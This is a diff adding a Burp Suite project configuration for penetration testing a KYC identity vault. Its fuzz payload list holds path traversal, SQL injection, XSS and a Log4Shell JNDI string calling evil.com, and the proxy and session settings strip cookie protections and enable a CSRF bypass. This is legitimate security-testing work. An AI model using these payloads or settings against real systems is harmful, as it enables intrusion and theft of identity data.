@@ -1,0 +1,237 @@
+{
+  "name": "KYC Vault Project",
+  "description": "Burp Suite project configuration for privacy-preserving KYC vault penetration testing",
+  "version": "1.0.0",
+  "author": "security-team",
+  "target": {
+    "scope": {
+      "include": [
+        {
+          "protocol": "https",
+          "host": "*.kyc-vault.internal",
+          "port": 443
+        },
+        {
+          "protocol": "https",
+          "host": "api.kyc-vault.io",
+          "port": 443
+        },
+        {
+          "protocol": "http",
+          "host": "localhost",
+          "port": 8080,
+          "file": ""
+        },
+        {
+          "protocol": "https",
+          "host": "*.kyc-vault.svc",
+          "port": 443
+        },
+        {
+          "protocol": "http",
+          "host": "localhost",
+          "port": 9001,
+          "file": ""
+        },
+        {
+          "protocol": "http",
+          "host": "localhost",
+          "port": 9003,
+          "file": ""
+        }
+      ],
+      "exclude": [
+        {
+          "protocol": "http",
+          "host": "localhost",
+          "port": 9090,
+          "file": ""
+        },
+        {
+          "protocol": "https",
+          "host": "grafana.kyc-vault.io",
+          "port": 443
+        }
+      ]
+    }
+  },
+
+  "proxy": {
+    "listeners": [
+      {
+        "bind_address": "127.0.0.1",
+        "port": 8085,
+        "force_ssl": false,
+        "certificate": {
+          "type": "generate",
+          "hostname": "kyc-vault.internal"
+        }
+      }
+    ],
+    "response_interception_rules": [
+      {
+        "enabled": true,
+        "match": "Set-Cookie:.*",
+        "action": ["strip_secure", "strip_httponly", "strip_samesite"]
+      }
+    ],
+    "tls_passthrough": [
+      "*.kyc-vault.internal"
+    ]
+  },
+
+  "scanner": {
+    "crawl_strategy": {
+      "max_depth": 10,
+      "max_paths_per_basis": 100,
+      "max_children_per_node": 20,
+      "max_mime_types": 50,
+      "targets": [
+        { "path": "/api/v1", "methods": ["GET", "POST", "PUT", "DELETE", "PATCH"] },
+        { "path": "/v1/did", "methods": ["GET", "POST", "PUT"] },
+        { "path": "/v1/credentials", "methods": ["GET", "POST", "PUT"] },
+        { "path": "/v1/zkp", "methods": ["GET", "POST"] },
+        { "path": "/v1/compliance", "methods": ["GET", "POST"] },
+        { "path": "/healthz", "methods": ["GET"] },
+        { "path": "/metrics", "methods": ["GET"] }
+      ]
+    },
+    "audit_strategy": {
+      "maximum_requests_per_minute": 10,
+      "skip_parameters_with_names": [
+        "api_key", "apiKey", "x-api-key", "Authorization", "token",
+        "jwt", "secret", "password", "passphrase"
+      ],
+      "insertion_points": [
+        "body_json",
+        "url_params",
+        "headers",
+        "cookies",
+        "xml_body",
+        "multipart_form"
+      ],
+      "skip_insertion_points_with_names": [
+        "signature", "proofValue", "credentialSignature"
+      ]
+    },
+    "consolidation": {
+      "duplicate_deduplication": true,
+      "consolidate_similar_endpoints": true,
+      "suppress_informational": false
+    }
+  },
+
+  "session_handling": {
+    "auth_type": "token",
+    "token_header": "x-api-key",
+    "macros": [
+      {
+        "name": "Authenticate via API key",
+        "requests": [
+          {
+            "url": "http://localhost:8080/auth/api-key",
+            "method": "POST",
+            "headers": {
+              "Content-Type": "application/json",
+              "x-api-key": "{{api_key}}"
+            },
+            "body": "{\"token\": \"{{api_key}}\"}",
+            "extract": {
+              "type": "json_path",
+              "path": "$.session_token",
+              "variable": "session_token"
+            }
+          }
+        ]
+      }
+    ],
+    "cookie_handling": "reuse",
+    "csrf_bypass": {
+      "enabled": true,
+      "origin_reflection": true,
+      "header_injection": ["x-forwarded-for", "x-real-ip"]
+    }
+  },
+
+  "extender": {
+    "extensions": [
+      {
+        "name": "Authorize - AuthZ checks",
+        "type": "jar",
+        "path": "burp-extender-authorize.jar"
+      },
+      {
+        "name": "JSON/JSBeautifier",
+        "type": "jar",
+        "path": "burp-extender-beautifier.jar"
+      },
+      {
+        "name": "Turbo Intruder",
+        "type": "jar",
+        "path": "burp-extender-turbo-intruder.jar"
+      },
+      {
+        "name": "JWT Editor",
+        "type": "jar",
+        "path": "burp-extender-jwt-editor.jar"
+      }
+    ]
+  },
+
+  "repeater": {
+    "follow_redirects": "always",
+    "update_content_length": true,
+    "unpack_gzip": true,
+    "connection_keep_alive": true
+  },
+
+  "intruder": {
+    "resource_pool": {
+      "max_concurrent_requests": 5,
+      "delay_between_requests_ms": 200
+    },
+    "attack_types": [
+      "sniper",
+      "battering_ram",
+      "pitchfork",
+      "cluster_bomb"
+    ],
+    "payload_sets": [
+      {
+        "name": "KYC-specific fuzz",
+        "type": "custom_iterator",
+        "entries": [
+          "did:kyc:issuer:admin",
+          "did:kyc:applicant:admin",
+          "../../etc/passwd",
+          "{{BaseURL}}",
+          "' OR '1'='1",
+          "${jndi:ldap://evil.com/a}",
+          "<script>alert(1)</script>",
+          "valid-credential-id-001",
+          "nonexistent-credential-id"
+        ]
+      }
+    ]
+  },
+
+  "decoder": {
+    "auto_decode": true,
+    "base64_handling": "decode",
+    "hex_handling": "decode"
+  },
+
+  "collaborator": {
+    "server": "burpcollaborator.net",
+    "poll_interval_ms": 5000,
+    "poll_count": 10
+  },
+
+  "reporting": {
+    "formats": ["html", "xml"],
+    "include_scope": true,
+    "include_technical_detail": true,
+    "include_remediation": true,
+    "template": "kyc-vault-report-template.xml"
+  }
+}
